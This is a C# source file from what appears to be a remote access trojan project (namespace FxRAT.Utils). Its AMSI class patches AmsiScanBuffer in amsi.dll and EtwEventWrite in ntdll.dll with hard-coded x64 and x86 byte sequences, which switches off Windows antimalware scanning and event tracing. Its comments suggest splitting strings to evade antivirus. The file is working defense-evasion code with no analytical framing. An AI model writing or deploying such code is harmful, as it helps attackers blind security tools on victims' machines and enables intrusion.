using System.Diagnostics;

namespace FxRAT.Utils;

public class AMSI
{
    
    private byte[] x64_etw_patch = { 0x48, 0x33, 0xC0, 0xC3 };
    private byte[] x86_etw_patch = { 0x33, 0xc0, 0xc2, 0x14, 0x00 };
    private byte[] x64_am_si_patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    private byte[] x86_am_si_patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
    public void bypass()
    {
        if (SystUtil.is64Bit())
        {
            PatchAMSI(x64_am_si_patch);
            PatchETW(x64_etw_patch);
        }
        else
        {
            PatchAMSI(x86_am_si_patch);
            PatchETW(x86_etw_patch);
        }
    }
    
    private static void PatchAMSI(byte[] patch)
    {
        string dll = "amsi.dll";
        foreach (ProcessModule CurrentModule in (Process.GetCurrentProcess().Modules))
        {
            Console.WriteLine(CurrentModule.ModuleName);
            if (CurrentModule.ModuleName == dll)
            {
                //Can always seperate strings to avoid AntiV
                SystUtil.PatchMem(patch, dll, ("AmsiScanBuffer"));
            }
        }
    }

    private static void PatchETW(byte[] Patch)
    {
        
        //Can always seperate strings to avoid AntiV
        SystUtil.PatchMem(Patch, ("ntdll.dll"), ("EtwEventWrite"));
    }
}